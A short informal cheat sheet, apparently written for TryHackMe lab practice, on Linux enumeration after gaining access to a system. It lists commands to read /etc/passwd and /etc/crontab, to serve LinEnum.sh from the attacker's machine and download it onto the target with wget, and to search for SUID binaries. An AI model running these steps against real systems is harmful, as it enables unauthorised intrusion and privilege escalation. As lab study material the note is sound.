Hello, friend.

Let's say that you manage to enter into a system. You first reflex is as follow :

Hostname
cat /etc/passwd
cat /etc/crontab

Launch a python server where your LinEnum.sh is located = python3 -m http.server 8000
On the target machine download the file : wget YOURIP:PORT/Linenum.sh

IF Linenum is not available for some reasons, do it yourself :). For example, let's look for some SUIG/SGID : 
find / -perm -u=s -type f 2>/dev/null

Use and abuse of this room : https://tryhackme.com/room/commonlinuxprivesc
